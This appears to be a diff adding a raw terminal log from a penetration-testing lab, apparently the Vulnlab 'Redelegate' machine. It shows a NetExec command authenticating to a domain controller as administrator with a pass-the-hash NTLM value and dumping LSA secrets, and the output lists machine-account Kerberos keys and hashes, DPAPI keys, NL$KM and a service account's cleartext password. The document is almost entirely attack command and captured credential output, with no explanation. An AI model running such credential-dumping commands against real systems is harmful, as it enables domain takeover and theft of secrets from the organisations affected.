@@ -1,0 +1,15 @@
+[05-01-2025 07:57:28]> /nix/store/s3861ylzxhb4p8zf9l82s8xvn8k5mil5-netexec-21.12.2024/bin/nxc smb dc.redelegate.vl -u administrator -H a066fbf49e79f43fffc449810227e399 --lsa --no-progress --log -
+
+2025-01-05 07:57:29 | smb.py:314 - INFO - SMB         10.10.67.52     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
+2025-01-05 07:57:29 | smb.py:508 - INFO - SMB         10.10.67.52     445    DC               [+] redelegate.vl\administrator:a066fbf49e79f43fffc449810227e399 (Pwn3d!)
+2025-01-05 07:57:30 | smb.py:1822 - INFO - SMB         10.10.67.52     445    DC               [+] Dumping LSA secrets
+2025-01-05 07:57:36 | smb.py:1799 - INFO - SMB         10.10.67.52     445    DC               REDELEGATE\DC$:aes256-cts-hmac-sha1-96:ede3827903f01b104002d15e129829f58a08136e4477dfe4d5b65b1352f56361
+2025-01-05 07:57:36 | smb.py:1799 - INFO - SMB         10.10.67.52     445    DC               REDELEGATE\DC$:aes128-cts-hmac-sha1-96:ee60522d2faf2a0a5093ae07696aaf22
+2025-01-05 07:57:36 | smb.py:1799 - INFO - SMB         10.10.67.52     445    DC               REDELEGATE\DC$:des-cbc-md5:4f4f510d1552f89d
+2025-01-05 07:57:36 | smb.py:1799 - INFO - SMB         10.10.67.52     445    DC               REDELEGATE\DC$:plain_password_hex:d5133aadfe54dce2bcc207593d5be31287574c77cfb8ba623d7e9f5267f6b7cc0a763acb6bf0ed2a24b6e0e63fe504a38c3c5b189f153b7b8d910dc6f649ec92e2ee423fb542c0c4b08e5cd406b11fddd6c00715ae0a184fb2ee0454ebcea7fb66c6173139b939300a1822894f16b58ef7584cfe6aebb5f08dd43fe13a07ac05239eef01ddf16709540c1880c2e34a0756a997154aae25e99598ac76278cc61cc68e5af723fefa0c59d1e941a12c3a1e30d255b341e33711f8564f60b6615d07568b2f8c8df00d464100e2da705c81bcdd15cbf320912ee89988fd32dbe853a0265675f98fb21c7d04d3e8256f8b5268
+2025-01-05 07:57:36 | smb.py:1799 - INFO - SMB         10.10.67.52     445    DC               REDELEGATE\DC$:aad3b435b51404eeaad3b435b51404ee:d1e64b569e79c88366ba93b43b648cf6:::
+2025-01-05 07:57:36 | smb.py:1799 - INFO - SMB         10.10.67.52     445    DC               dpapi_machinekey:0x329e3f315c1e7294f086908d3d14c990c030305a
+dpapi_userkey:0x2bd12147462ab2b6e92adcb202c9d8258c270790
+2025-01-05 07:57:37 | smb.py:1799 - INFO - SMB         10.10.67.52     445    DC               NL$KM:7ef465544c71041d24fc9bed7b0db11bf0e60ebfef1378c104489fae464939a5d6a994e1cc13fb7d290200c1f8cd61f38c6d56421e8b3a92e18ee03c6e7704bc
+2025-01-05 07:57:37 | smb.py:1799 - INFO - SMB         10.10.67.52     445    DC               REDELEGATE\sql_svc:SuperDuperStrongPassword123
+2025-01-05 07:57:37 | smb.py:1827 - INFO - SMB         10.10.67.52     445    DC               [+] Dumped 8 LSA secrets to /home/pascal/.nxc/logs/DC_10.10.67.52_2025-01-05_075729.secrets and /home/pascal/.nxc/logs/DC_10.10.67.52_2025-01-05_075729.cached
